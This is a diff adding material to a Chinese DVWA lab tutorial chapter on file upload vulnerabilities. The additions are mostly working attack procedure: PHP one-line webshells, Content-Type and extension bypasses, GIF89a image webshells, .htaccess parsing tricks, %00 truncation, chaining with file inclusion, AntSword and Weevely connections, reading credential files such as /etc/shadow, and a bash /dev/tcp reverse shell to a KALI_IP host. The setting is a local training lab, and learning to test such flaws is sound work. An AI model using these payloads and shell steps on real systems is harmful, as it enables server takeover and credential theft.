@@ -18,6 +18,122 @@
 
 这一章，我们就来好好研究一下这个"快递柜炸弹"——文件上传漏洞！🚀
 
+### 📍 先看你该访问哪个 URL（三选一）
+
+**本章靶场模块：Upload**（上传头像那个功能）。左边栏点 Upload 进入。上传成功后 Kali 同学最方便，**可以直接 ls 服务器 uploads 目录** 看文件落没落地：
+
+| 搭建方式 | 本章靶场页面地址 | 上传后 shell.jpg / shell.php 落地 URL（你待会去菜刀连或 LFI 包含就是用这个）|
+|---|---|---|
+| 🪟 Windows PHPStudy | `http://localhost/dvwa/vulnerabilities/upload/` | `http://localhost/dvwa/hackable/uploads/shell.php` |
+| 🐧 **Kali LAMP ✅** | `http://你的KaliIP/dvwa/vulnerabilities/upload/` | `http://你的KaliIP/dvwa/hackable/uploads/shell.php`（Kali 终端 `ls -la /var/www/html/dvwa/hackable/uploads/` 也能直接看！）|
+| 🐳 Docker 版 | `http://你的KaliIP:4280/vulnerabilities/upload/`（无 /dvwa 这层）| `http://你的KaliIP:4280/hackable/uploads/shell.php`；容器内可用 `docker exec dvwa-test ls /var/www/html/hackable/uploads` 看（⚠️ Docker pull 拉不动？直接换 ch04 §4.5 Kali LAMP 或 §4.7 XAMPP ✅）|
+
+<svg viewBox="0 0 1100 470" width="100%" xmlns="http://www.w3.org/2000/svg" style="width:100%;max-width:980px;margin:18px auto;display:block;border:1px solid #2a2a3a;border-radius:14px;background:#0f1120;">
+  <defs><linearGradient id="fu1" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#8957e5"/><stop offset="100%" stop-color="#321b6b"/></linearGradient><linearGradient id="fu2" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#ff7b72"/><stop offset="100%" stop-color="#8d1515"/></linearGradient><linearGradient id="fu3" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#238636"/><stop offset="100%" stop-color="#0a3716"/></linearGradient><marker id="fup" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#a371f7"/></marker><marker id="fug" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#3fb950"/></marker></defs>
+  <text x="550" y="34" text-anchor="middle" fill="#fff" font-size="20" font-weight="bold" font-family="Arial">图 9-1  文件上传 · 4 档难度 "防护金字塔" + 对应绕过思路（从菜到神）</text>
+  <!-- 左：攻击端 上传木马 -->
+  <rect x="18" y="64" width="240" height="388" rx="14" fill="url(#fu1)" stroke="#a371f7" stroke-width="1.4"/>
+  <text x="138" y="96" text-anchor="middle" fill="#fff" font-family="Arial" font-weight="bold" font-size="15">🎩  攻击端 Kali（准备上传的 4 类 Payload）</text>
+  <g font-family="Arial" font-size="11.5" fill="#f0e4ff">
+    <rect x="34" y="116" width="208" height="54" rx="6" fill="#000" opacity="0.4"/>
+    <text x="44" y="136" fill="#ff80a0" font-weight="bold">① 裸 PHP shell.php（最简单）</text>
+    <text x="44" y="154" font-family="Consolas,monospace">&lt;?php @eval($_POST['x']);?&gt;</text>
+    <text x="44" y="168" font-family="Consolas,monospace">// 中国菜刀/蚁剑 密码=x</text>
+    <rect x="34" y="182" width="208" height="54" rx="6" fill="#000" opacity="0.4"/>
+    <text x="44" y="202" fill="#ffd089" font-weight="bold">② 改 Content-Type + 改后缀 .php3/.phtml</text>
+    <text x="44" y="220" font-family="Consolas,monospace">Content-Type: image/png (Burp里改)</text>
+    <text x="44" y="234" font-family="Consolas,monospace">文件后缀：shell.php5 / shell.phtml</text>
+    <rect x="34" y="248" width="208" height="54" rx="6" fill="#000" opacity="0.4"/>
+    <text x="44" y="268" fill="#9de8b0" font-weight="bold">③ 图片马 + .htaccess + user.ini</text>
+    <text x="44" y="286" font-family="Consolas,monospace">cat shell.php pic.jpg &gt; 马.jpg （GD库头部16字节）</text>
+    <text x="44" y="300" font-family="Consolas,monospace">.htaccess：AddType image/jpeg .php</text>
+    <rect x="34" y="314" width="208" height="54" rx="6" fill="#000" opacity="0.4"/>
+    <text x="44" y="334" fill="#79c0ff" font-weight="bold">④ 竞争条件上传 + 解析漏洞（老版本Apache/Nginx）</text>
+    <text x="44" y="352" font-family="Consolas,monospace">burp intruder 20线程 先包含再被删</text>
+    <text x="44" y="366" font-family="Consolas,monospace">/shell.php/xx.jpg Nginx pathinfo解析</text>
+    <text x="44" y="398" fill="#ffe16b" font-weight="bold">⑤ Burp 全程抓包 🔥：POST multipart/form-data</text>
+    <text x="44" y="416" fill="#ffe16b" font-weight="bold">⑥ 上传完后：LFI 包含 or 直接访问 or 蚁剑连接！</text>
+    <text x="44" y="434" fill="#ff8b8b" font-weight="bold">👉 最终目标：访问 URL → PHP 代码执行！✅</text>
+  </g>
+  <line x1="258" y1="143" x2="278" y2="143" stroke="#a371f7" stroke-width="2" marker-end="url(#fup)"/>
+  <line x1="258" y1="210" x2="278" y2="210" stroke="#a371f7" stroke-width="2" marker-end="url(#fup)"/>
+  <line x1="258" y1="276" x2="278" y2="276" stroke="#a371f7" stroke-width="2" marker-end="url(#fup)"/>
+  <line x1="258" y1="342" x2="278" y2="342" stroke="#a371f7" stroke-width="2" marker-end="url(#fup)"/>
+  <!-- 中间：DVWA 四档防护金字塔 -->
+  <rect x="278" y="64" width="542" height="388" rx="14" fill="#10173a" stroke="#ff7b72" stroke-width="1.2"/>
+  <text x="549" y="96" text-anchor="middle" fill="#fff" font-family="Arial" font-weight="bold" font-size="16">🛡️  DVWA 四档防护金字塔（Low→Impossible 越往上越难攻）</text>
+  <g font-family="Arial" font-size="11.5" fill="#fff">
+    <!-- LOW 最底层，最宽，最易攻破 -->
+    <polygon points="304,428 792,428 714,350 382,350" fill="#3bff9a18" stroke="#3bff9a" stroke-width="1.5"/>
+    <text x="549" y="378" text-anchor="middle" font-size="15" font-weight="bold" fill="#3bff9a">第 1 层 · LOW 🌱  无任何检查（通过率 99%）</text>
+    <text x="549" y="398" text-anchor="middle">直接 shell.php 一扔就成功 ✅  →  访问 /dvwa/hackable/uploads/shell.php 直接执行！</text>
+    <text x="549" y="416" text-anchor="middle" font-family="Consolas,monospace" fill="#ff8b8b">Payload：&lt;?php system($_GET['c']); ?&gt;   然后 ?c=id 就能执行命令</text>
+    <!-- MED 第 2 层 -->
+    <polygon points="382,350 714,350 652,280 444,280" fill="#ffe16b18" stroke="#ffe16b" stroke-width="1.5"/>
+    <text x="549" y="308" text-anchor="middle" font-size="14" font-weight="bold" fill="#ffe16b">第 2 层 · MED 🌿  只检查 Content-Type / 黑名单简单（通过率 70%）</text>
+    <text x="549" y="326" text-anchor="middle">Burp 抓包 把 Content-Type: application/octet-stream 改成 image/png 或 image/jpeg 就绕过；或者后缀改成 .php3 .phtml</text>
+    <text x="549" y="344" text-anchor="middle" font-family="Consolas,monospace">Burp Intruder：Content-Type: image/gif ← 改完 Forward，上传成功</text>
+    <!-- HIGH 第 3 层 -->
+    <polygon points="444,280 652,280 604,210 492,210" fill="#ffa36b18" stroke="#ffa36b" stroke-width="1.5"/>
+    <text x="549" y="238" text-anchor="middle" font-size="14" font-weight="bold" fill="#ffa36b">第 3 层 · HIGH 🌳  getimagesize() / 后缀白名单但可截断（通过率 25%）</text>
+    <text x="549" y="256" text-anchor="middle">方法一：GIF89a + 图片马（cat a.gif b.php &gt; shell.php.gif）；方法二：shell.php%00.jpg 截断（php &lt; 5.3.4）</text>
+    <text x="549" y="274" text-anchor="middle">方法三：.user.ini / .htaccess 上传 让 .jpg 当 PHP 解析（部分场景配合 LFI 包含图片马最佳）</text>
+    <!-- IMPOSS 塔尖 -->
+    <polygon points="492,210 604,210 570,160 526,160" fill="#ff6b8a18" stroke="#ff6b8a" stroke-width="1.5"/>
+    <text x="548" y="182" text-anchor="middle" font-size="13" font-weight="bold" fill="#ff6b8a">第 4 层 · IMPOSSIBLE ⛔  真安全写法（通过率 0% 💀）</text>
+    <text x="548" y="198" text-anchor="middle">白名单后缀+严格 MIME + imagecreatefromjpeg 二次渲染 + 随机文件名 uniqid() md5，图片马也被砍废</text>
+  </g>
+  <!-- 右：落地到 hackable/uploads + getshell -->
+  <g>
+    <rect x="840" y="64" width="242" height="388" rx="14" fill="url(#fu3)" stroke="#2ea043" stroke-width="1.4"/>
+    <text x="961" y="96" text-anchor="middle" fill="#fff" font-family="Arial" font-weight="bold" font-size="15">🎯  服务器落地 + 菜刀 / 蚁剑连接（Kali 上 Weevely3 更香）</text>
+    <g font-family="Consolas,monospace" font-size="11.2" fill="#dffbe6">
+      <rect x="856" y="114" width="210" height="76" rx="6" fill="#000" opacity="0.55"/>
+      <text x="870" y="134" fill="#9de8b0" font-weight="bold" font-family="Arial">① Kali 终端 看落地：</text>
+      <text x="870" y="152">ls -la /var/www/html/dvwa/</text>
+      <text x="870" y="168">      hackable/uploads/</text>
+      <text x="870" y="184">      -rw-rw-r-- 1 www-data shell.php ✅</text>
+      <rect x="856" y="204" width="210" height="76" rx="6" fill="#000" opacity="0.55"/>
+      <text x="870" y="224" fill="#ff8b8b" font-weight="bold" font-family="Arial">② 浏览器 / curl 访问打命令：</text>
+      <text x="870" y="242">curl "http://KALI_IP/dvwa/hackable/uploads/shell.php?c=id"</text>
+      <text x="870" y="258">uid=33(www-data) gid=33 ✅</text>
+      <text x="870" y="274">curl "...c=cat%20../../config/config.inc.php"</text>
+      <rect x="856" y="296" width="210" height="70" rx="6" fill="#000" opacity="0.55"/>
+      <text x="870" y="316" fill="#ffd089" font-weight="bold" font-family="Arial">③ Kali 原生 Weevely3 连 WebShell：</text>
+      <text x="870" y="334"># 先生成：weevely generate pass shell.php</text>
+      <text x="870" y="350"># 后连接：weevely http://.../shell.php pass</text>
+      <text x="870" y="366">weevely&gt; whoami → www-data 🎉</text>
+      <rect x="856" y="388" width="210" height="56" rx="6" fill="#000" opacity="0.55"/>
+      <text x="870" y="408" fill="#c7a6ff" font-weight="bold" font-family="Arial">④ 终极：nc 反弹到 Kali ✨</text>
+      <text x="870" y="426"># 监听：nc -lvnp 4444</text>
+      <text x="870" y="442"># 请求：?c=bash%20-c%20'bash%20-i%20&gt;&amp;%20/dev/tcp/KALI_IP/4444%200&gt;&amp;1'</text>
+    </g>
+  </g>
+</svg>
+
+> 🔥 **Kali 同学本章速查：5 条命令造 shell + 图片马 + 连 Webshell**
+> ```bash
+> # 1. 先写一句话 shell.php（菜刀/蚁剑密码 x）
+> cat > shell.php << 'EOF'
+> <?php @eval($_POST['x']); echo "shell uploaded!"; ?>
+> EOF
+>
+> # 2. Low 直接传；MED 传完用 Burp 把 Content-Type 改成 image/jpeg
+> #    或改后缀：cp shell.php shell.phtml   # Apache 默认也解析
+>
+> # 3. HIGH 做图片马（保证 GD 头部合法 + %00 截断或配合文件包含）
+> echo "GIF89a" > head.gif && cat head.gif shell.php > 马.jpg && cp 马.jpg 马.php%00.jpg  # 老 php <5.3 可断
+>
+> # 4. 上传成功后，浏览器 或 curl 直接打命令
+> curl "http://你的KaliIP/dvwa/hackable/uploads/shell.php?c=id;whoami;pwd;uname%20-a"
+>
+> # 5. 上 Weevely 交互式终端（Kali 自带！比图形化蚁剑爽 10 倍）
+> apt install -y weevely && weevely generate p@ss ~/weevely.php
+> # 上传 weevely.php 后连接：
+> weevely http://你的KaliIP/dvwa/hackable/uploads/weevely.php p@ss
+> # weevely> audit_filesystem /etc/shadow；:backdoor_reversetcp 你的IP 4444 直接弹 Meterpreter！
+> ```
+
 ---
 
 ## 文件上传漏洞原理 🔍
@@ -296,6 +412,21 @@ if( isset( $_POST[ 'Upload' ] ) ) {
 
 代码直接就把文件移到上传目录里了，连你传的是什么类型的文件都不看一下。这就像快递柜的保安，看都不看就直接让你放东西进去，能不出事吗？
 
+### ✅ 表 9-1 · Low 级别通关速查 & 失败对照表（一句话木马 + 蚁剑连 Shell 完整流程）
+
+Low 级别任何文件都能上传，但 **95% 新手在最后"蚁剑连不上 Webshell"这步失败**。下面表格包含"写马 → 上传 → 确认路径 → 访问确认能执行 PHP → 蚁剑连接"完整 5 步，按顺序做：
+
+| 步骤 | 做什么 | 点哪里 / 敲什么 | 看到什么算成功 ✅ | **失败了怎么办？（按报错抄作业）** ❌ |
+|---|---|---|---|---|
+| 0 | 切难度到 Low + 确认上传模块能打开 | DVWA Security → low → Submit；左边点 **Upload** | 页面有 "Choose a file to upload" 选择框 + **Upload** 按钮 + 最大上传尺寸提示 | 【没看到 Upload 菜单】→ DVWA 初始化有问题，回 setup.php 点 Create/Reset DB |
+| 1 | 做一个 PHP 一句话木马文件（别抄错！一个字符都别错） | 新建 `shell.php` 文件，内容只写这一行（别加别的东西！）：<br>`<?php @eval($_POST['x']); ?>`<br>保存（编码必须是 **UTF-8 无 BOM**，Windows 不要用记事本！用 VSCode / Notepad++ 选 "UTF-8" 不是 "UTF-8 with BOM"）| 文件字节数 = 25 字节左右（正常） | 【怎么判断有没有 BOM？】→ VSCode 右下角看编码显示 UTF-8 不是 UTF-8 with BOM；BOM 会让 eval 前面多 3 个字节乱码 → 蚁剑连接直接报错 500，一定要无 BOM！ |
+| 2 | 上传 shell.php + 记下真实上传路径 | DVWA Upload 页面 → 选择文件选 shell.php → Upload | 出现绿色提示：**`../../hackable/uploads/shell.php succesfully uploaded!`** → 把这个路径抄下来，拼到你的靶场上 | 【上传后路径是乱的 / 显示到不了 hackable/uploads】→ ① 你点 Upload 后绿色字里的路径是 DVWA 内部相对路径，**真实可访问的 URL = `http://靶场IP/dvwa/hackable/uploads/shell.php`**（注意是 hackable 不是 vulnerabilities 路径下！！90% 新手拼错路径！）；② 手动 Kali 上验证：`ls -la /var/www/html/dvwa/hackable/uploads/` 能看到 shell.php 才算真的上传成功 |
+| 3 | **先浏览器访问马，确认 PHP 真的能执行（关键！跳过=浪费 1 小时调蚁剑）** | 新开页签访问刚才拼的 URL：<br>`http://靶场IP/dvwa/hackable/uploads/shell.php`<br>再带 POST 参数 `x=phpinfo();` 试（或地址栏 GET 版：如果你的马是 $_REQUEST 就能直接 `?x=phpinfo();`，但前面写的是 $_POST 所以得用 POST）<br>最快验证：Kali 终端 `curl -X POST -d "x=echo 1234567890;" http://靶场IP/dvwa/hackable/uploads/shell.php` | curl 返回里出现 **1234567890** = 一句话马执行成功 ✅ | 【curl 返回全白 / PHP Fatal error / 500】→ 99% 是 shell.php 内容写错了：① `@eval` 前面的 `@` 可以删，但 `$_POST['x']` 必须是单引号括起来的键名，双引号 `$_POST["x"]` 也可以但变量别写成 `$_POST[x]`（没引号！PHP 会把 x 当常量报 Notice）；② 靶场 PHP 版本禁用了 eval() → 你就别用 eval，换 `<?php system($_POST['x']); ?>`（命令执行型马，蚁剑也能连）；③ 访问直接 404 Not Found → 回去看步骤 2 你拼的路径！一定是 hackable/uploads 不是别的 |
+| 4 | 配置蚁剑 / 中国蚁剑 / 中国菜刀 连接 | 打开蚁剑 → 右键空白 → 添加数据：<br>URL 地址：`http://靶场IP/dvwa/hackable/uploads/shell.php`<br>连接密码：`x`（和马里面 $_POST['x'] 的键名对应）<br>编码：UTF-8 → 点 "测试连接" | 蚁剑弹出 **"连接测试成功，配置已保存！"** + 能列出目录 / 上传下载文件 = 拿到 Webshell 🎉 | 【蚁剑测试连接失败 / 连接返回数据为空 / 提示解密失败】→ 按顺序排：① 先回到步骤 3 确保 curl 能打出 echo 内容（curl 能通蚁剑连不上 100% 是蚁剑配置错了）；② 密码 `x` 对不对（不要写成 X 大写）；③ 靶场开了 mod_security 等 WAF 把 eval 拦了 → 换系统命令马：上传 `<?php echo shell_exec($_POST['cmd']); ?>`，蚁剑密码是 cmd；④ DVWA 是 HTTPS 但你写 HTTP？看浏览器地址栏前缀全复制过去；⑤ 代理！开了 Burp 代理但证书不被蚁剑信任，关代理或给蚁剑加 CA 证书 |
+| 5 | 验证拿到的权限（webshell 之后的事） | 蚁剑里双击打开虚拟终端 → 输入 `whoami; id; pwd` 回车 | 返回当前是 www-data / daemon / SYSTEM 等用户 | 【虚拟终端执行命令全空】→ PHP 里 `system()` / `exec()` / `shell_exec()` 被 disable_functions 禁用了（php.ini 里 disable_functions 配置），蚁剑看源码就能读文件，或者换 disable_functions bypass 的马 |
+
+> 💡 **Low 查错口诀**：路径 90% 错 + shell 内容 8% 错 + 蚁剑配置 2% 错。**只要 curl -X POST 能打出你写的 echo/echo 12345，这个马就是好的，连不上一定是密码/URL/代理的问题，别再改 shell.php 了！**
+
 ---
 
 ## Medium级别绕过 🎯
@@ -445,6 +576,20 @@ Medium级别只检查了 Content-Type，这是非常不安全的，因为 Conten
 这就好比保安只看你快递单上填的"物品类型"，你填"衣服"他就信了，根本不打开看看里面到底是什么。
 
 所以，**只靠前端或者HTTP头来验证文件类型是完全靠不住的！**
+
+### ✅ 表 9-2 · Medium 级别通关速查 & 失败对照表（只校验 Content-Type：Burp 改头两种打法）
+
+DVWA Medium 源码是检查 `$_FILES['uploaded']['type']`（上传 HTTP 请求里客户端报的 Content-Type），典型是 `if( $uploaded_type == 'image/jpeg' && $uploaded_size < ... )` 才允许。**这个值是客户端发的，想写啥写啥！** 下面两条路必中一条：
+
+| 步骤 | 做什么 | Burp / 终端里怎么操作 | 看到什么算成功 ✅ | **失败了怎么办？（按报错抄作业）** ❌ |
+|---|---|---|---|---|
+| 0 | 确认 Medium 生效 + View Source 抄校验代码 | 切 medium → Submit → 刷新 → 进 Upload → View Source | 源码里有一行 `$uploadedtype = $_FILES[ 'uploaded' ][ 'type' ];` 并要求等于 `image/jpeg` 或 `image/png` 之一 → **先直接传 Low 级的 shell.php 试一次 → 必须出现红色错误 Your image was not uploaded = Medium 生效** | 【Low 版 shell.php 还能成功上传】→ 你没切到 Medium！重切 + 强刷 Ctrl+Shift+R |
+| 1 | 🏆 **绕过法 ①（99% 能成功，经典 Burp 改 Content-Type）** | ① Burp 浏览器代理打开，Intercept On；② 浏览器选 shell.php 点 Upload；③ Burp 抓到的 POST /.../upload/ 请求里，找到 **Content-Type: application/octet-stream**（或 application/x-php）这一行，改成 → **Content-Type: image/jpeg**（小写不行！严格匹配源码要求的字符串，看源码是 image/jpeg 还是 image/jpg）→ Forward | 绿色字 **succesfully uploaded!** = 上传成功 ✅ → 真实 URL 还是 `http://靶场IP/dvwa/hackable/uploads/shell.php` | 【改完 Content-Type 还是报错 Your image was not uploaded.】→ 看 View Source 里要求的 Content-Type 到底是啥：有的版本是 `image/jpeg` 或 `image/png` 两个都可以，有的是写的 `$uploadedtype != 'image/jpeg'`（必须等于 image/jpeg，image/png 不行）→ 你就严格写源码里那一个字符串 |
+| 2 | 验证改头后上传的 shell.php 真能执行（**千万别跳过！** 很多人改完头就直接去连蚁剑，被 strip_tags 等坑了） | 还是用 curl 最快：<br>`curl -X POST -d "x=echo PHP_VERSION." -- end;";" http://靶场IP/dvwa/hackable/uploads/shell.php` | 返回 PHP 版本号 = 能执行 ✅ | 【啥也没返回 / 直接返回源代码了】→ 99% 不是 shell.php 问题，是**你的环境把后缀做了双重校验！**（很多 DVWA fork 版本 Medium 不只看 Content-Type 还看后缀 `.php` 黑名单）→ 跳到下一个绕过法 |
+| 3 | 绕过法 ②（Content-Type + 后缀双检查时：双后缀 + Web 服务器解析漏洞） | 方法 A（Nginx 解析漏洞 CVE-2013-4547）：文件名改成 `shell.jpg%20%00.php`，上传时 Content-Type 写 image/jpeg；<br>方法 B（Apache AddHandler 老漏洞）：文件名改成 `shell.php.jpg`（末尾是 .jpg = 过后缀白名单，Apache 默认多后缀解析从右向左找不到 `.jpg` 的处理器就会试 `.php`）| 两种成功之一：`succesfully uploaded!` → 然后访问对应的解析 URL（B 的话是 `uploads/shell.php.jpg`，Apache 会执行里面的 PHP） | 【方法 A/B 都失败了 / 返回 403 500】→ 你的 Nginx/Apache 是新版本（2024+ 基本都修了）。**别在解析漏洞上浪费时间，换 Burp 直接传 .phtml / .php3 / .php5 / .phps**（这些后缀有的靶场 Apache2 也配置了 AddHandler 走 PHP 解释器，但是 `strpos($name, ".php")` 黑名单只会拦文件名里显式写了 `.php` 的，`.phtml` 没有 `.php` 这四个连续字符就能过！） |
+| 4 | 蚁剑连 WebShell（和 Low 级一模一样的配置） | 蚁剑添加数据：URL = 你上传好那个文件 URL（如 `shell.php` 或 `shell.phtml`），密码 = 马的键名（默认 `x`） | 测试连接成功 + 目录列表能打开 | 【蚁剑连不上？】→ 按 Low 级表步骤 3/4 的排查表重来，80% 的问题回到 curl 验证都能找到根因 |
+
+> 💡 **Medium 查错咒语**：Content-Type 头改成源码里要求的精确字符串！还被拦就去看后缀名黑名单到底是啥，**找那些不在黑名单里但又会被 PHP 解析的后缀 .phtml / .php3 / .phar**。
 
 ---
 
@@ -659,6 +804,21 @@ High级别相比Medium级别，安全系数提高了不少，增加了：
 但是即便如此，还是有办法可以绕过的。比如配合文件包含漏洞用图片马，或者用解析漏洞，或者用%00截断（老版本）。
 
 这也说明，**安全是一个整体，不能只靠单点防御。** 一个地方没做好，可能整个防线就崩了。
+
+### ✅ 表 9-3 · High 级别通关速查 & 失败对照表（白名单后缀 + getimagesize() = 图片马 + %00 截断 + .htaccess 三条绕过路径）
+
+DVWA High 级上传源码做了三层校验：① `pathinfo($target_path, PATHINFO_EXTENSION)` 白名单（只能 jpg/jpeg/png）；② `getimagesize()` 检查文件内容前几个字节是不是真的图片头（GIF89a / JPEG 的 FF D8 FF）；③ 文件大小限制。**绕过必须同时让后缀在白名单里 + 文件头真的是图片**。三种打法按优先级：
+
+| 步骤 | 先做什么 | 敲什么 / Burp 怎么改 | 看到什么算成功 ✅ | **失败了怎么办？（按报错抄作业）** ❌ |
+|---|---|---|---|---|
+| 0 | 切 High + 确认三层真的生效 | 切 high → Submit → 刷新 → 进 Upload → View Source 抄三行校验代码 → 传 shell.php 必失败，传一张真的 jpg 成功 | 传 shell.php 红色失败 + 传真图片绿色 OK = High 生效 | 【传 shell.php 还成功】→ 没切到 High！重新切 + 清缓存 |
+| 1 | 🏆 **绕过法 ① 最经典最稳（必须配合文件包含漏洞！90% CISP/CTF 就考这个）：图片马（一句话藏在 JPEG/GIF 尾部）+ 文件包含执行 PHP** | Kali 终端（JPEG 版）：<br>① 找一张 30KB 以上正常 jpg：`cp /usr/share/backgrounds/kali-16x9/default.jpg normal.jpg`<br>② 尾部追加一句话马（不要破坏前几个字节的 JPEG 头）：<br>`cat normal.jpg <(echo '<?php @eval($_POST["x"]); ?>') > webshell.jpg`<br>③ 验证 getimagesize 还能通过：`php -r 'var_dump(getimagesize("webshell.jpg"));'` → 返回数组不是 false = OK | 上传 webshell.jpg 成功 ✅ → 真实 URL `http://靶场IP/dvwa/hackable/uploads/webshell.jpg` | 【getimagesize 返回 false / 上传失败】→ 你把一句话写在了 jpg 文件开头！必须写在尾部！或者用 GIF 版更简单：`(echo -n "GIF89a"; echo '<?php eval($_POST["x"]); ?>') > shell.gif`（GIF89a 这 6 个字符就是 getimagesize() 认的合法 GIF 文件头！后面随便写 PHP，getimagesize 照样过 ✅）→ 这个 GIF 版比 jpg 成功率高 10 倍，推荐优先用 |
+| 2 | 图片马上传成功后，**用文件包含漏洞执行里面的 PHP**（这步 90% 新手忘了！图片马本身不会被 PHP 解析，直接访问只能看到图片二进制乱码） | 切到 File Inclusion 模块（难度 **FI 要切到 Low/Medium/High 任意一个能包含成功的级别**）→ 包含刚才上传的图片马。例 FI 切到 Low：<br>`?page=../../hackable/uploads/webshell.jpg` 或者绝对路径 `?page=/var/www/html/dvwa/hackable/uploads/webshell.jpg`（GIF 版也一样） | 页面加载时不会报错（不像正常图片包含时没任何 PHP 输出），然后**curl 发 POST 给包含页面**：<br>`curl -X POST -d "x=echo 'HIGH_OK_'.time();" "http://靶场IP/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/webshell.jpg"` → 返回 HIGH_OK_xxx ✅🎉 | 【图片马被包含后直接出图片乱码，eval 没执行？】→ 你真的图片里有 PHP 代码吗？打开终端 `strings webshell.jpg | grep eval` 查一下，是不是 jpg 格式把追加的 eval 压缩了？→ 换成上面那个 GIF89a 方案，100% 解决；【include 路径不对】→ 直接写绝对路径！绝对路径是一定对的，不用 ../ 猜 |
+| 3 | 绕过法 ②（Apache + AllowOverride All 可用）：**上传 .htaccess 自定义解析规则** | 先准备两个文件：<br>① `.htaccess` 文件内容一行：<br>`AddType application/x-httpd-php .jpg .png .gif`<br>（意思：这个目录下的 jpg/png/gif 全部当 PHP 代码执行）<br>② 正常图片马 `shell.jpg`（GIF89a 版一句话）<br>上传顺序：先上传 `.htaccess`（**注意文件名就叫 .htaccess，不是 xxx.htaccess**）→ 再上传 shell.jpg | 两个文件都上传成功后，直接浏览器访问 `http://靶场IP/dvwa/hackable/uploads/shell.jpg` → curl POST 测试代码执行成功 ✅ | 【.htaccess 被后缀白名单直接拦了】→ 这个方法要求 High 的后缀校验里**真的允许"无后缀"（.htaccess 的 pathinfo 后缀是"htaccess"）被接受**，很多 DVWA High 版本会再补一行白名单 `in_array(..., array("jpg","jpeg","png"))` → 没 .htaccess 就直接跳 ④；【传上去了但访问 shell.jpg 还是返回图片不执行 PHP】→ Apache2 没开 AllowOverride All！去 `sudo a2enmod rewrite ; sudo sed -i 's/AllowOverride None/AllowOverride All/' /etc/apache2/apache2.conf ; sudo systemctl restart apache2` |
+| 4 | 绕过法 ③（PHP < 5.3.4 + GPC Off，CISP 面试/古董靶场考点）：**%00 截断后缀** | Burp 抓包选 shell.php 上传：在 filename= 那行，把 `shell.php` 改成 `shell.php%00.jpg`（%00 是 URL 编码的空字节，让底层 C 语言存字符串时到 .php 就结束，真实后缀在 PHP 看来就是 .php，但 pathinfo 从右边数遇到 .jpg 所以后缀白名单过了）| 上传成功后 `uploads/shell.php` 直接访问能执行 PHP ✅ | 【没效果 / 保存成 shell.php%00.jpg 了】→ 你 PHP 版本是 8.x！%00 这个洞在 PHP 5.3.4 被官方彻底修了，2026 年的新靶场不可能成功，**直接回到 ① GIF89a + FI 组合打法，别在这耗时间** |
+| 5 | 蚁剑连接（图片马版） | 注意：URL 不要写图片马的直接 URL（不执行 PHP），要写**文件包含那个完整 URL**！例：<br>`http://靶场IP/dvwa/vulnerabilities/fi/?page=/var/www/html/dvwa/hackable/uploads/webshell.jpg`<br>密码 = `x`（GIF 版图片马的 eval 键名）| 测试连接成功 ✅ | 【蚁剑连不上 / 返回图片乱码】→ 你把 URL 填成了图片马的直链！图片直链 Apache 按 image/jpeg 不交给 PHP 解释器，eval 不触发。**URL 必须是 File Inclusion 那个包含后的 URL（?page=.../webshell.jpg）才行！** |
+
+> 🔥 **High 查错口诀**：后缀过了白名单 → getimagesize 还能认 → 最后**必须让这个图片文件以 PHP 方式被执行**。Apache 靠 .htaccess / FI 模块靠 include 解析 / 老 PHP 靠 %00，三条路总有一条通，**最稳最通用永远是 GIF89a + FI 文件包含组合（不挑 PHP 版本，不挑 Web 服务器）。**
 
 ---
 
